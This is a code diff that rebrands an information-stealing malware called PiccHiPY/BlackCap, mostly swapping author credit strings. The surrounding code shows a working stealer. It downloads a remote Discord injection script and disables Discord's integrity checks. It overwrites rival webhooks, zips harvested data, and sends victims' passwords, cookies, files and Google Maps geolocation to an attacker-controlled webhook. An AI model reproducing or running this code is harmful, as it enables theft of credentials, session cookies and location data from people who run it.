@@ -44,7 +44,7 @@ NotPSSW = []
 
 __config__ = {
     "yourwebhookurl": "%WEBHOOK_HERE%",
-    "bc_injection_url": "https://raw.githubusercontent.com/Senior-Picchi/BlackCap-Inject/main/index.js",
+    "bc_injection_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     "hide": "%_hide_script%",
     "ping": "%ping_enabled%",
     "pingtype": "%ping_type%",
@@ -638,7 +638,7 @@ class first_function_bc(Functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item["ksch_is_here"] = "https://github.com/SeniorPicchi"
+                item["ZIS_is_here"] = "https://github.com/SeniorPicchi"
                 item["auto_start"] = False
                 item["auto_start_discord"] = False
                 item["integrity"] = False
@@ -655,7 +655,7 @@ class first_function_bc(Functions):
             with open(config, "w") as f:
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, "a") as f:
-                f.write("\n\n//KSCH_is_here | https://github.com/SeniorPicchi")
+                f.write("\n\n//ZIS_is_here | https://github.com/SeniorPicchi")
 
     async def kill_process_id(self):
         bllist = self.find_in_config("blprggg")
@@ -680,7 +680,7 @@ class first_function_bc(Functions):
             x = self.regex_webhook_dsc
             with open(bd, "r", encoding="cp437", errors="ignore") as f:
                 txt = f.read()
-                content = txt.replace(x, "KSCHishere")
+                content = txt.replace(x, "ZISishere")
             with open(bd, "w", newline="", encoding="cp437", errors="ignore") as f:
                 f.write(content)
 
@@ -1236,12 +1236,12 @@ GoogleMaps: {self.googlemap}
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "PiccHiPY| https://github.com/SeniorPicchi\n\n"
+                                "PiccHiPY Create By ZIS | https://github.com/SeniorPicchi\n\n"
                             )
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
                                 x
-                                + "\n\nPiccHiPY | https://github.com/SeniorPicchi"
+                                + "\n\nPiccHiPY Create By ZIS | https://github.com/SeniorPicchi"
                             )
         _zipfile = ntpath.join(self.appdata, f"BC-[{login_info}].zip")
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
@@ -1268,12 +1268,12 @@ GoogleMaps: {self.googlemap}
             "embeds": [
                 {
                     "author": {
-                        "name": f"PiccHiPY v2.3",
+                        "name": f"PiccHiPY - ZIS",
                         "url": "https://github.com/SeniorPicchi",
                         "icon_url": "https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif",
                     },
                     "color": 374276,
-                    "description": f"[PiccHiPY has Geo Localised this guy]({self.googlemap})",
+                    "description": f"[PiccHiPY - ZIS has Geo Localised this guy]({self.googlemap})",
                     "fields": [
                         {
                             "name": "\u200b",
@@ -1323,7 +1323,7 @@ GoogleMaps: {self.googlemap}
                         },
                     ],
                     "footer": {
-                        "text": "PiccHiPY・https://github.com/SeniorPicchi"
+                        "text": "PiccHiPY Create By ZIS ・https://github.com/SeniorPicchi"
                     },
                 }
             ],
@@ -1676,11 +1676,11 @@ def upload(name, tk=""):
                         {"name": "Interesting files found on user PC:", "value": tk}
                     ],
                     "author": {
-                        "name": f"PiccHiPY",
+                        "name": f"PiccHiPY - ZIS",
                         "url": "https://github.com/SeniorPicchi",
                         "icon_url": "https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif",
                     },
-                    "footer": {"text": "github.com/KSCHdsc"},
+                    "footer": {"text": "github.com/SeniorPicchi"},
                     "color": 374276,
                 }
             ],
@@ -1704,12 +1704,12 @@ def upload(name, tk=""):
                 {
                     "fields": [{"name": "Passwords Found:", "value": ra}],
                     "author": {
-                        "name": f"PiccHiPY",
+                        "name": f"PiccHiPY - ZIS",
                         "url": "https://github.com/SeniorPicchi",
                         "icon_url": "https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif",
                     },
                     "footer": {
-                        "text": "github.com/KSCHdsc",
+                        "text": "github.com/SeniorPicchi",
                     },
                     "color": 374276,
                 }
@@ -1729,12 +1729,12 @@ def upload(name, tk=""):
                 {
                     "fields": [{"name": "Cookies Found:", "value": rb}],
                     "author": {
-                        "name": f"PiccHiPY",
+                        "name": f"PiccHiPY - ZIS",
                         "url": "https://github.com/SeniorPicchi",
                         "icon_url": "https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif",
                     },
                     "footer": {
-                        "text": "github.com/KSCHdsc",
+                        "text": "github.com/SeniorPicchi",
                     },
                     "color": 374276,
                 }
@@ -1749,7 +1749,7 @@ def upload(name, tk=""):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\{name}.txt"
     with open(path, mode="w", encoding="utf-8") as f:
-        f.write(f"Created by KSCH | https://github.com/SeniorPicchi\n\n")
+        f.write(f"Created by ZIS | https://github.com/SeniorPicchi\n\n")
         for line in data:
             if line[0] != "":
                 f.write(f"{line}\n")
